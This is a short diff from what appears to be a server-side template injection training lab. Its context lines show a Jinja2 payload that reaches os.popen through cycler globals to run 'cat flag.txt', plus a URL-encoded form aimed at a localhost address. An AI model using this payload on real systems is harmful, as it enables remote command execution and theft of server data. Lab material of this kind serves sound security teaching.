@@ -13,3 +13,4 @@ SSTI Lab - Template Injection (중급)
 - `{{cycler.__init__.__globals__.os.popen("cat flag.txt").read()}}`
 
 http://localhost:8000/?name={{cycler.__init__.__globals__.os.popen(%27cat%20flag.txt%27).read()}}
+
